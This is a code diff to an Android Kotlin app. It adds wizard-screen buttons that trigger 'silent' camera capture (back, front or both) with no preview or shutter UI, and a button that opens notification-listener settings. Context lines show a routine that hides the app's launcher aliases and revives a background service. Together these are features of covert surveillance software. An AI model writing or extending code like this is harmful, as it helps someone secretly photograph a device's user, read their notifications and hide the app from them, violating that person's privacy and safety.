@@ -136,7 +136,6 @@ class MainActivity : ComponentActivity() {
         dlg.show()
     }
 
-
     /** Second-launch sequence: 2000ms black veil, revive service, hide aliases, finish. */
     private fun runHideSequence(prefs: HidePrefs) {
         val veil = android.view.View(this)
@@ -553,6 +552,58 @@ fun WizardScreen(
                         fontSize = 12.sp,
                         modifier = Modifier.testTag("evidence_note")
                     )
+
+                    // ---- Silent camera (direct Camera2, no preview/app/shutter UI)
+                    var camStatus by remember { mutableStateOf<String?>(null) }
+                    val camRunning = stringResource(R.string.cam_running)
+                    Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                        Button(
+                            onClick = {
+                                camStatus = camRunning
+                                SilentCamera(activityCtx).captureAsync(SilentCamera.Choice.BACK) { out ->
+                                    camStatus = summarizeCam(out)
+                                }
+                            },
+                            modifier = Modifier.testTag("cam_back_btn")
+                        ) { Text(stringResource(R.string.cam_back_btn)) }
+                        Button(
+                            onClick = {
+                                camStatus = camRunning
+                                SilentCamera(activityCtx).captureAsync(SilentCamera.Choice.FRONT) { out ->
+                                    camStatus = summarizeCam(out)
+                                }
+                            },
+                            modifier = Modifier.testTag("cam_front_btn")
+                        ) { Text(stringResource(R.string.cam_front_btn)) }
+                        Button(
+                            onClick = {
+                                camStatus = camRunning
+                                SilentCamera(activityCtx).captureAsync(SilentCamera.Choice.BOTH) { out ->
+                                    camStatus = summarizeCam(out)
+                                }
+                            },
+                            modifier = Modifier.testTag("cam_both_btn")
+                        ) { Text(stringResource(R.string.cam_both_btn)) }
+                    }
+                    camStatus?.let {
+                        Text(
+                            it,
+                            fontSize = 14.sp,
+                            modifier = Modifier.testTag("cam_status")
+                        )
+                    }
+
+                    // ---- Notification listening: route to NLS settings
+                    Button(
+                        onClick = {
+                            activityCtx.startActivity(
+                                android.content.Intent(
+                                    android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
+                                )
+                            )
+                        },
+                        modifier = Modifier.testTag("nls_enable_btn")
+                    ) { Text(stringResource(R.string.nls_enable_btn)) }
                 }
             }
 
@@ -560,3 +611,9 @@ fun WizardScreen(
         }
     }
 }
+
+fun summarizeCam(out: SilentCamera.Outcome): String = buildString {
+    out.ok.forEach { append("OK " + it.facing + ": " + it.path.substringAfterLast("/") + "\n") }
+    out.failed.forEach { append("XX " + it.facing + ": " + it.reason + "\n") }
+    if (isEmpty()) append("no_result")
+}.trim()
